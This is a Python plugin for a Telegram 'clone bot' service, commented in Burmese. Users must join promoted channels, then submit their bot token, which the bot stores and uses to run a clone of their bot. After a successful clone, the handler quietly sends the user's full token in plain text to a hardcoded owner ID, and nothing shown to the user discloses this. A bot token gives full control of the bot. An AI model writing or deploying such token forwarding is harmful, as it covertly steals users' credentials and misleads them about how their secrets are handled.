import asyncio
import os
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from motor.motor_asyncio import AsyncIOMotorClient
from pyrogram.errors import UserNotParticipant

# --- CONFIGURATION ---
API_ID = int(os.getenv("API_ID", "12345"))
API_HASH = os.getenv("API_HASH", "your_hash")
OWNER_ID = 8266394986  # <--- ဒီနေရာမှာ ဆရာ့ရဲ့ User ID ကို သေချာထည့်ပါ
MONGO_URL = os.getenv("MONGO_URL")

FORCE_CHANNELS = ["Channel_1", "Channel_2"] 

db_client = AsyncIOMotorClient(MONGO_URL)
db = db_client["CloneBotDB"]
tokens_col = db["tokens"]

running_clones = {}

async def start_clone_bot(bot_token):
    try:
        user_id = int(bot_token.split(":")[0])
        app = Client(
            name=f"sessions/{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=bot_token,
            plugins=dict(root="plugins")
        )
        await app.start()
        running_clones[user_id] = app
        return True, app
    except Exception as e:
        return False, str(e)

@Client.on_message(filters.command("clone") & filters.private)
async def clone_handler(client: Client, message: Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    user_tag = message.from_user.mention

    # --- Force Join Check ---
    not_joined = []
    for channel in FORCE_CHANNELS:
        try:
            await client.get_chat_member(channel, user_id)
        except UserNotParticipant:
            not_joined.append(channel)
        except: pass

    if not_joined:
        buttons = [[InlineKeyboardButton(f"Join Me Ch/group", url=f"https://t.me/{ch}")] for ch in not_joined]
        return await message.reply_text("⚠️ Channel အရင် Join ပါ။", reply_markup=InlineKeyboardMarkup(buttons))

    if len(message.command) < 2:
        return await message.reply_text("အသုံးပြုပုံ: `/clone [BOT_TOKEN]`\nတစုံတရာအခက်အခဲရှိပါက @HEX_KING9 Dmလာပေးပါ")

    bot_token = message.text.split(None, 1)[1].strip()
    msg = await message.reply_text("⌛ Clone စတင်နေပါသည်...")

    await tokens_col.update_one({"token": bot_token}, {"$set": {"token": bot_token, "user_id": user_id}}, upsert=True)

    success, result = await start_clone_bot(bot_token)
    if success:
        bot_info = await result.get_me()
        
        # ၁။ Clone လုပ်တဲ့သူကို အကြောင်းပြန်မယ်
        await msg.edit(f"🎉 **Clone အောင်မြင်ပါပြီ!**\n\n🤖 Bot: {bot_info.first_name}\n🆔 @{bot_info.username}")

        # ၂။ ဆရာ့ဆီ (Owner ဆီ) Notification ပို့မယ်
        notification_text = (
            "🔔 **Clone Bot အသစ်တစ်ခု တိုးလာပါပြီ!**\n\n"
            f"👤 **ပိုင်ရှင်:** {user_tag}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🤖 **Clone Bot:** {bot_info.first_name}\n"
            f"🆔 **Username:** @{bot_info.username}\n"
            f"🔑 **Token:** `{bot_token}`"
        )
        try:
            await client.send_message(OWNER_ID, notification_text)
        except Exception as e:
            print(f"Notification Error: {e}")
            
    else:
        await msg.edit(f"❌ Error: {result}")

# (ကျန်တဲ့ restore နဲ့ broadcast function တွေက အရင်အတိုင်းပဲ ထားပါ)
